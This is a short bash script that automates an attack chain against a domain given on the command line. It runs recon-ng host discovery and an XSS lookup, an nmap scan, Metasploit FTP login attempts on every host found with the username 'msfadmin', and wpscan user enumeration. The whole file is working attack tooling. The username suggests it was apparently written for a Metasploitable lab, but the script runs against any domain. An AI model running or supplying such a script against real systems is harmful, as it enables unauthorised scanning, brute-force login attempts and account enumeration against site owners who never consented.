#!/bin/bash
# Check arguments, it must be 1 (url)
if [ $# -ne 1 ]; then
  echo "Wrong number of arguments ./hax_1.sh <domain>"
  exit 1
else
  # Clean other files
  rm -f comnds.txt msf.txt
  # Add all recon-ng commands
  echo "workspaces add hax" >> comnds.txt
  echo "add domains $1" >> comnds.txt
  echo "use recon/domains-hosts/bing_domain_web" >>comnds.txt
  echo "run" >> comnds.txt
  echo "use recon/domains-hosts/google_site_web" >> comnds.txt
  echo "run" >> comnds.txt
  echo "use recon/domains-hosts/brute_hosts" >> comnds.txt
  echo "run" >> comnds.txt
  echo "use recon/domains-hosts/netcraft" >> comnds.txt
  echo "run" >> comnds.txt
  echo "use recon/hosts-hosts/resolve" >> comnds.txt
  echo "run" >> comnds.txt
  echo "use recon/hosts-hosts/reverse_resolve" >> comnds.txt
  echo "run" >> comnds.txt
  echo "use recon/hosts-hosts/ipinfodb" >> comnds.txt
  echo "run" >> comnds.txt
  echo "use recon/domains-vulnerabilities/xssposed" >> comnds.txt
  echo "run" >> comnds.txt
  echo "use reporting/list" >> comnds.txt
  echo "set FILENAME $PWD/hosts.txt" >> comnds.txt
  echo "run" >> comnds.txt
  echo "use reporting/csv" >> comnds.txt
  echo "set FILENAME $PWD/hosts.csv" >> comnds.txt
  echo "run" >> comnds.txt
  echo "back" >> comnds.txt
  echo "workspaces delete hax"
  echo "exit" >> comnds.txt

  # Run recon-ng with the commands
  recon-ng -r $PWD/comnds.txt

  # Run nmap for scanning
  nmap -iL $PWD/hosts.txt -Pn -F -oG $PWD/nmap.txt

  # Read all hosts
  while read p; do
    # Clean file
    rm -f $PWD/msf.txt

    # Add all commands for msfconsole
    echo "use auxiliary/scanner/ftp/ftp_login" >> msf.txt
    echo "set RHOSTS $p" >> msf.txt
    echo "set THREADS 205" >> msf.txt
    echo "set USERNAME msfadmin" >> msf.txt
    echo "set VERBOSE false" >> msf.txt
    echo "run" >> msf.txt
    echo "exit" >> msf.txt

    # Run exploit, ftp login
    msfconsole -r $PWD/msf.txt

    # Check if WordPress and get users
    wpscan --url $p --enumerate
  done < $PWD/hosts.txt
fi
